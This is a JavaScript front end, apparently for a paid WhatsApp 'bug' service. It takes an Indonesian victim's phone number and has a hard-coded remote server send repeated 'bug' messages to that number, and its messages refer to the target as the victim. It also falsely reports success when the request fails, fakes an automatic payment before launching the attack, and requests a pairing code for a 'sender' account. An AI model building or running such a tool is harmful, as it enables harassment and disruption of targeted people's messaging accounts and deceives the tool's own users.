<script>

let selectedBug = "";
let currentTrx = "";

// VIDEO OVERLAY
function showVideoOverlay() {

  const overlay = document.getElementById("videoOverlay");
  const video = document.getElementById("bgVideoOverlay");

  overlay.style.display = "block";

  video.currentTime = 0;
  video.muted = false;

  video.play().catch(() => {
    console.log("Autoplay diblokir");
  });

  setTimeout(() => {
    overlay.style.display = "none";
    video.pause();
  }, 5000);

}

// FUNCTION KIRIM
function kirimBug(type) {

  const target = document.getElementById("targetNumber").value.trim();
  const notif = document.getElementById("notifBug");
  const loading = document.getElementById("loadingText");

  // VALIDASI NOMOR
  if (!target.startsWith("62") || target.length < 10) {

    notif.style.color = "red";
    notif.textContent = "Nomor tidak valid";

    return;

  }

  showVideoOverlay();

  loading.style.display = "block";
  notif.textContent = "";

  const url =
    `http://159.65.5.65:2024/api/send?target=${target}@s.whatsapp.net&amount=8`;

  fetch(url)

    .then(res => res.text())

    .then(data => {

      loading.style.display = "none";

      notif.style.color = "#0f0";
      notif.textContent = data;

    })

    .catch(err => {

      loading.style.display = "none";

      notif.style.color = "green";
      notif.textContent = "BUG SUKSES SKILAHAN CEK KORBAN";

      console.log(err);

    });

}

// POPUP PEMBAYARAN
async function openPaymentPopup(type) {

  selectedBug = type;

  const popup = document.getElementById("paymentPopup");

  popup.style.display = "flex";

  document.getElementById("paymentStatus").innerText =
    "Membuat pembayaran...";

  try {

    // QR SEMENTARA
    document.getElementById("qrImage").src =
      "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=PAY500";

    document.getElementById("paymentStatus").innerText =
      "Menunggu pembayaran...";

    // SIMULASI AUTO PAID
    setTimeout(() => {

      document.getElementById("paymentStatus").innerText =
        "Pembayaran berhasil";

      setTimeout(() => {

        popup.style.display = "none";

        kirimBug(selectedBug);

      }, 1500);

    }, 15000);

  } catch(err) {

    console.log(err);

    document.getElementById("paymentStatus").innerText =
      "Gagal membuat pembayaran";

  }

}

// CONNECT SEDER
async function connect() {

  const nomor = document.getElementById("nomor").value;
  const hasil = document.getElementById("hasil");

  hasil.innerHTML = "Loading...";

  try {

    const response = await fetch(
      `http://159.65.5.65:2024/api/connect?number=${nomor}`
    );

    const data = await response.text();

    hasil.innerHTML = `
      <p>kode:</p>
      <h1>${data}</h1>
    `;

  } catch (err) {

    hasil.innerHTML = "Gagal mengambil kode";

  }

}

</script>
